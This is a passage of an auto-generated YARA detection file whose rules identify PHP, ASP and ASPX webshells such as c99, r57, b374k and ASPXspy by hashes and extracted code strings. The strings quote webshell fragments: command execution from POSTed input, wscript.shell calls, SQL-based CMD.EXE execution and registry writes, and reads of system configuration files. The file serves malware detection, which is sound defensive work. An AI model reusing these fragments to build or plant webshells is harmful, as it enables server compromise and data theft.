      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash12 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $s2 = "echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';" fullword ascii
      $s3 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $s4 = "\"Find *config*.php in current dir\" => \"dir /s /w /b *config*.php\"," fullword ascii
      $s5 = "$tmp = array('name' => $dirContent[$i]," fullword ascii
      $s6 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcslashes(h" ascii
      $s7 = "var arr=reg.exec(req.responseText);" fullword ascii
      $s8 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcslashes(h" ascii
      $s9 = "\"show opened ports\" => \"netstat -an | grep -i listen\"," fullword ascii
      $s10 = "function processReqChange() {" fullword ascii
      $s11 = "\"Find index.php in current dir\" => \"dir /s /w /b index.php\"," fullword ascii
      $s12 = ".'<tr><td></td><td><table style=\"padding-left:15px\"><tr><td><span>Login</span></td>'" fullword ascii
      $s13 = "die('<script>g(null,null,\"'.urlencode($_POST['p3']).'\",null,\"\")</script>');" fullword ascii
      $s14 = "if(@$_POST['p2']=='download') {" fullword ascii
      $s15 = ".'<td><input type=text name=login value=\"root\"></td></tr>'" fullword ascii
      $s16 = "if($dirContent === false) {" fullword ascii
      $s17 = "\"find service.pwd files in current dir\" => \"find . -type f -name service.pwd\"," fullword ascii
      $s18 = " 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i])," fullword ascii
      $s19 = "$db->dump($v);" fullword ascii
      $s20 = " 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i])," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99shell_c99_w4cking_Shell__ci___Biz_was_here_c99_46 {
   meta:
      description = "webshell - from files c66.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $s2 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s3 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s4 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
      $s5 = "     else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $s6 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=eval><textarea name=\\\"eval\\\" cols=" ascii
      $s7 = "   echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\".substr(decoct(fileperms($d.$f)),-4,4).\")</b><b" ascii
      $s8 = " if (file_get_contents(\"/etc/syslog.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=syslog.conf&d=\".urlen" ascii
      $s9 = " if (file_get_contents(\"/etc/userdomains\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=userdomains&d=\".urlen" ascii
      $s10 = "   echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><input type=" ascii
      $s11 = " getenv(\"PHPRC\").\" -q %f%\" => array(\"php\",\"php3\",\"php4\")," fullword ascii
      $s12 = "elseif (trim($cmd) == \"tasklist\") {$act = \"processes\";}" fullword ascii
      $s13 = " if (file_get_contents(\"/etc/httpd.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=httpd.conf&d=\".urlenco" ascii
      $s14 = " displaysecinfo(\"Is GET installed?\",myshellexec(\"which GET\"));" fullword ascii
      $s15 = "      $fqb_log .= \"Connected to \".getenv(\"SERVER_NAME\").\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"" ascii
      $s16 = " if (file_get_contents(\"/usr/local/apache/conf/httpd.conf\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=httpd" ascii
      $s17 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $s18 = " displaysecinfo(\"HDD space\",myshellexec(\"df -h\"));" fullword ascii
      $s19 = "  if (file_get_contents($v)) {echo \"<b><font color=red>You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s20 = " displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule __2014__2012_47 {
   meta:
      description = "webshell - from files _2014.asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash2 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
      $s2 = ":ExeCuTe(ShiSanFun(ShiSan)):" fullword ascii
      $s3 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><a href=http://\"&siteurl&\" target=_blan" ascii
      $s4 = "\"&mNametitle&\"</A><hr><FORM Action='\"&URL&\"' method=Post><INPUT type=Password name=Pass size=22>&nbsp;<input type=submit val" ascii
      $s5 = "execute(shisanfun(\"gnihtoN=DLOF teS" fullword ascii
      $s6 = ">'%001'=htdiw elbat<" fullword ascii /* reversed goodware string '<table width='100%'>' */
      $s7 = "=ferh a<" fullword ascii /* reversed goodware string '<a href=' */
      $s8 = ">elbat/<>rt/<" fullword ascii /* reversed goodware string '</tr></table>' */
      $s9 = "fig.redlof" fullword ascii /* reversed goodware string 'folder.gif' */
      $s10 = "j\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'>\"&topad&\"<br><a href='javascript:history." ascii
      $s11 = "61 - VOOtidE = VOOtidE" fullword ascii
      $s12 = "0=KOOtidE:2 - VOOtidE = VOOtidE" fullword ascii
      $s13 = "821 - VOOtidE = VOOtidE" fullword ascii
      $s14 = "Obt(1,0) = \"wscript.shell\"" fullword ascii
      $s15 = "23 - VOOtidE = VOOtidE" fullword ascii
      $s16 = "j\".cmd{background-color:#000;color:#FFF}\"" fullword ascii
      $s17 = "46 - VOOtidE = VOOtidE" fullword ascii
      $s18 = "8 - VOOtidE = VOOtidE" fullword ascii
      $s19 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\">\"" fullword ascii
      $s20 = "0=KOOtidE:1 - VOOtidE = VOOtidE" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _ASPXspy2_icesword_AspxSpy2014Final_111_aspx_48 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, icesword.aspx, AspxSpy2014Final.aspx, 111.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
      hash3 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
      hash4 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
      hash5 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
   strings:
      $s1 = "Process[] p=Process.GetProcesses();" fullword ascii
      $s2 = "File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);" fullword ascii
      $s3 = "s+=@\"function Bin_PostBack(eventTarget,eventArgument)\";" fullword ascii
      $s4 = "lace(\"\\\\\",\"/\")+\"\\\" target=\\\"_blank\\\">\"+Bin_Files.Name+\"</a>\";" fullword ascii
      $s5 = "if(Request[\"__EVENTTARGET\"]==\"Bin_Editfile\" || Request[\"__EVENTTARGET\"]==\"Bin_Createfile\")" fullword ascii
      $s6 = "page.RegisterHiddenField(\"__EVENTTARGET\",\"\");" fullword ascii
      $s7 = "filename.Text=\"<a href=\\\"\"+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1))" ascii
      $s8 = "<asp:TableRow CssClass=\"head\"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:Tabl" ascii
      $s9 = "<asp:TableRow CssClass=\"head\"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:Tabl" ascii
      $s10 = "<td><span style=\"float:right;\" id=\"Bin_Span_FrameVersion\" runat=\"server\"></span>" fullword ascii
      $s11 = "td.Text=sp.ProcessName.ToString();" fullword ascii
      $s12 = "<%--Process--%>" fullword ascii
      $s13 = "foreach(Process sp in p)" fullword ascii
      $s14 = "td.Text=dt.Rows[j][\"ProcessID\"].ToString();" fullword ascii
      $s15 = "s+=@\"theform.__EVENTTARGET.value=eventTarget;\";" fullword ascii
      $s16 = "TR.Attributes[\"title\"]=\"Site:\"+child.Properties[\"ServerComment\"].Value.ToString();" fullword ascii
      $s17 = "page.RegisterStartupScript(\"\",s);" fullword ascii
      $s18 = "Bin_Span_FrameVersion.InnerHtml=\"Framework Ver : \"+Environment.Version.ToString();" fullword ascii
      $s19 = "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"/>" fullword ascii
      $s20 = "rk=Registry.Users;" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _bat_b4tm4n_bat_2_7_asw_49 {
   meta:
      description = "webshell - from files bat_b4tm4n.php, bat_2.7.php, asw.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "591efefbc046698998c618234d7ff702b65a9ef7e12cd74980558fb9d0350e98"
      hash2 = "d0197a3e0134bd5ef63d5a2b7699f6aa8403c94251ff33c88c9d1c2c83c0e335"
      hash3 = "88f4bed46b4e8ba8237edb2374a1bef7a252a01a54836ead82b5c7e989c12411"
   strings:
      $s1 = "// THIS IS FUCKING LOCAL DAMN LOG N00B! (https://github.com/k4mpr3t/b4tm4n/issues/5)" fullword ascii
      $s2 = "\"target-map\"=>array(\"title\"=>\"Target Map\",\"ver\"=>\"2.0\",\"auth\"=>\"k4mpr3t\")," fullword ascii
      $s3 = "$reads[]=\"<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='\".urle($filedir).\"' /></center><" ascii
      $s4 = "$reads[]=\"<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='\".urle($dir).\"'/></center></td" ascii
      $s5 = "#process-list{padding:25px;margin:25px auto 0px;border:1px solid var(--border-color);overflow:scroll;overflow-y:hidden}" fullword ascii
      $s6 = "$link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);" fullword ascii
      $s7 = "$sql=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);" fullword ascii
      $s8 = "<!-- div class='mysql-process-result'>" fullword ascii
      $s9 = "<tr><td>Logitude</td><td>%s</td></tr>" fullword ascii
      $s10 = "php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['subtitle']," fullword ascii
      $s11 = "$reads[]=\"<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='\".urle($filedir).\"' /></center><" ascii
      $s12 = "<h4 style='text-align:center;color:var(--txt-color)'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=green>[%" ascii
      $s13 = "<h4 style='text-align:center;color:var(--txt-color)'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=green>[%" ascii
      $s14 = "ion' href='?a=d&r=\".urle($filedir).\"' title='Download File'>&#10149;</a></td></tr>\";" fullword ascii
      $s15 = "</div -->" fullword ascii
      $s16 = "$url=sprintf(B64D(\"zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa\").\"?q=%s,%s&z=10&output=embed\",$json['lat'],$json['lon']);" fullword ascii
      $s17 = "#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-colo" ascii
      $s18 = ".content{border:1px solid var(--border-color);padding:10px;overflow:auto;overflow-y:hidden}" fullword ascii
      $s19 = "#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-colo" ascii
      $s20 = ".tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid var(--border-color)}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _adminer_4_2_4_fbi_50 {
   meta:
      description = "webshell - from files adminer-4.2.4.php, fbi.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bbbf3709995e0cb8924bc07e857042afdf5a294620c32e12136805ed6bb8735b"
      hash2 = "bd65b84162530f62ea657288eb982eb12b18af8fdd9e3f71c536f626e6a261b3"
   strings:
      $s1 = "get_rows('SELECT sess.process AS \"process\", sess.username AS \"user\", sess.schemaname AS \"schema\", sess.status AS \"status" ascii
      $s2 = "* @license http://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)" fullword ascii
      $s3 = "INDEX(CURRENT_USER, '@', -1) AS Host\");echo\"<form action=''><p>\\n\";hidden_fields_get();echo\"<input type='hidden' name='db' " ascii
      $s4 = "get_vals(\"SELECT DISTINCT owner FROM dba_segments WHERE owner IN (SELECT username FROM dba_users WHERE default_tablespace NOT I" ascii
      $s5 = "get_rows(\"SHOW FULL PROCESSLIST\");}function" fullword ascii
      $s6 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s7 = "get_rows('SELECT sess.process AS \"process\", sess.username AS \"user\", sess.schemaname AS \"schema\", sess.status AS \"status" ascii
      $s8 = "* @author Jakub Vrana, http://www.vrana.cz/" fullword ascii
      $s9 = "* @license http://www.apache.org/licenses/LICENSE-2.0 Apache License, Version 2.0" fullword ascii
      $s10 = "<meta http-equiv=\"Content-Script-Type\" content=\"text/javascript\">" fullword ascii
      $s11 = "get_vals(\"SELECT DISTINCT owner FROM dba_segments WHERE owner IN (SELECT username FROM dba_users WHERE default_tablespace NOT I" ascii
      $s12 = "get_vals(\"EXEC sp_databases\");}function" fullword ascii
      $s13 = "/** Adminer - Compact database management" fullword ascii
      $s14 = "N 'UPDATE' WHEN OBJECTPROPERTY(s.id, 'ExecIsDeleteTrigger') = 1 THEN 'DELETE' END [Event]," fullword ascii
      $s15 = " 1 THEN 'UPDATE' WHEN OBJECTPROPERTY(sys1.id, 'ExecIsDeleteTrigger') = 1 THEN 'DELETE' END [Event]," fullword ascii
      $s16 = "'<input type=\"hidden\" name=\"'.DRIVER.'\" value=\"'.h(SERVER).'\">':\"\"),'<input type=\"hidden\" name=\"username\" value=\"'." ascii
      $s17 = "ORDER BY PROCESS" fullword ascii
      $s18 = "hidden_fields_get(){echo(sid()?'<input type=\"hidden\" name=\"'.session_name().'\" value=\"'.h(session_id()).'\">':''),(SERVER!=" ascii
      $s19 = "process_list(){return" fullword ascii
      $s20 = "dumpFormat(){return" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_lnc_51 {
   meta:
      description = "webshell - from files shell.php, lnc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
   strings:
      $s1 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $s2 = "$cmd = \"cmd.exe\";" fullword ascii
      $s3 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $s4 = "shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passth" ascii
      $s5 = "$user = \" <a href=\\\"?action=nowuser\\\" target=\\\"_blank\\\">" fullword ascii
      $s6 = ":'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','" fullword ascii
      $s7 = "elseif ($_POST['do'] == 'downloads') {" fullword ascii
      $s8 = "   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" ascii
      $s9 = "elseif ($_GET['action'] == \"downloads\"){" fullword ascii
      $s10 = "        echo \"<font color=blue>Send: site exec</font> <font color=green>\".$_POST[\"SUCommand\"].\"</font><br>\";" fullword ascii
      $s11 = ":<input type=\"checkbox\" name=\"type2\" value=\"getpath\" onclick=\"javascript:alert(\\'" fullword ascii
      $s12 = "        $sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii
      $s13 = "$tb->formheader(''.$action.' \"target=\"_blank' ,'" fullword ascii
      $s14 = " if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];" fullword ascii
      $s15 = "closedir($tempdir);" fullword ascii
      $s16 = " echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";" fullword ascii
      $s17 = " : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');" fullword ascii
      $s18 = "$filecontent = $_POST['filecontent'];" fullword ascii
      $s19 = "ru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');" fullword ascii
      $s20 = "$filecontent = \"?\".\">\".$_POST['filecontent'].\"<?\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_ctt_sh_c99_w4cking_Shell__ci___Biz_was_here_c99_52 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, ctt_sh.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash5 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash6 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash7 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $x1 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $s2 = "  elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url a" ascii
      $s3 = "  $sql_sock = mysql_connect($sql_server.\":\".$sql_port, $sql_login, $sql_passwd);" fullword ascii
      $s4 = "d dump of \\$GLOBALS.</b></center>\";}" fullword ascii
      $s5 = "  $tmp = ob_get_contents();" fullword ascii
      $s6 = "  $uploadfile = $HTTP_POST_FILES[\"uploadfile\"];" fullword ascii
      $s7 = "  header(\"Content-type: image/gif\");" fullword ascii
      $s8 = "function mysql_dump($set)" fullword ascii
      $s9 = "  header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword ascii
      $s10 = "  header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword ascii
      $s11 = "if (!function_exists(\"getmicrotime\")) {function getmicrotime() {list($usec, $sec) = explode(\" \", microtime()); return ((floa" ascii
      $s12 = "# Host settings:" fullword ascii
      $s13 = "  $len = ceil($len/2) - 2;" fullword ascii
      $s14 = "# Date: \".date(\"d.m.Y H:i:s\").\"" fullword ascii
      $s15 = "  global $HTTP_POST_FILES;" fullword ascii
      $s16 = "  elseif ($ft == \"download\")" fullword ascii
      $s17 = "if ($act == \"ftpquickbrute\")" fullword ascii
      $s18 = " else {return $content;}" fullword ascii
      $s19 = "function str2mini($content,$len)" fullword ascii
      $s20 = "  $searchtime = getmicrotime();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b374k_2_2_b374k_2_3_53 {
   meta:
      description = "webshell - from files b374k-2.2.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash2 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "if(oci_execute($st)){" fullword ascii
      $s2 = "=\"login\" style=\"width:120px;\" value=\"\" />" fullword ascii
      $s3 = "var buff = document.getElementById('cmd');" fullword ascii
      $s4 = "<div id=\"content\" id=\"box_shell\">" fullword ascii
      $s5 = "$file = wordwrap(file_get_contents($f),160,\"\\n\",true);" fullword ascii
      $s6 = "if($t = file_get_contents($u)){" fullword ascii
      $s7 = "if(document.getElementById(l + '_')) document.getElementById(l + '_').focus();" fullword ascii
      $s8 = "if(trim($sqlport)!=\"\") $hostandport = $sqlhost.\":\".$sqlport;" fullword ascii
      $s9 = "$hostandport = $sqlhost;" fullword ascii
      $s10 = "$hasil = odbc_exec($con, $query);" fullword ascii
      $s11 = "exec($c,$r);" fullword ascii
      $s12 = "<?php echo $s_name; ?>&nbsp;<span class=\"gaya\"><?php echo $s_ver; ?></span><input id=\"login\" class=\"inputz\" type=\"passwor" ascii
      $s13 = "<input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitlogin\" style=\"width:80px;\" />" fullword ascii
      $s14 = "<form action=\\\"\" . $_SERVER['PHP_SELF'] . \"?upload\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\">" fullword ascii
      $s15 = "<form action=\\\"\" . $_SERVER['PHP_SELF'] . \"?upload\\\" method=\\\"post\\\">" fullword ascii
      $s16 = "<?php echo $s_name; ?>&nbsp;<span class=\"gaya\"><?php echo $s_ver; ?></span><input id=\"login\" class=\"inputz\" type=\"passwor" ascii
      $s17 = "<script type=\"text/javascript\" src=\"<?php echo $_SERVER['PHP_SELF'].\"?sorttable\"; ?>\"></script>" fullword ascii
      $s18 = "<a href=\\\"javascript:tukar('\".cs($filn).\"_link','\".cs($filn).\"_form');\\\">rename</a> |" fullword ascii
      $s19 = "$group = posix_getgrgid(filegroup($folder));" fullword ascii
      $s20 = "<form action=\\\"\" . $_SERVER['PHP_SELF'] . \"?db\\\" method=\\\"post\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57_kartal_r57_r57_iFX_54 {
   meta:
      description = "webshell - from files r57shell127.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash4 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s2 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s3 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii
      $s4 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii
      $s5 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii
      $s6 = "echo sr(45,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s7 = "echo sr(45,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s8 = "     $sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "     $sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s10 = "  $db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s11 = "]):(\"dump.sql\"))));" fullword ascii
      $s12 = "echo sr(45,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','mysql_p',15,(!empty($_POST['mysql_p'])?($_POST['mysql_p" ascii
      $s13 = "if ($_POST['cmd']==\"db_show\")" fullword ascii
      $s14 = " $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s15 = "  $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s16 = "    @ociexecute($stat);" fullword ascii
      $s17 = " $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s18 = "  $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);" fullword ascii
      $s19 = " if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }" fullword ascii
      $s20 = " if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _UnKnown_Vip__1__UnKnown_Vip_r00tsFSO_55 {
   meta:
      description = "webshell - from files UnKnown Vip (1).asp, UnKnown Vip.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash2 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash3 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $x1 = "ODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.E" ascii
      $s2 = "       STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD." ascii
      $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s4 = "       STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SAN" ascii
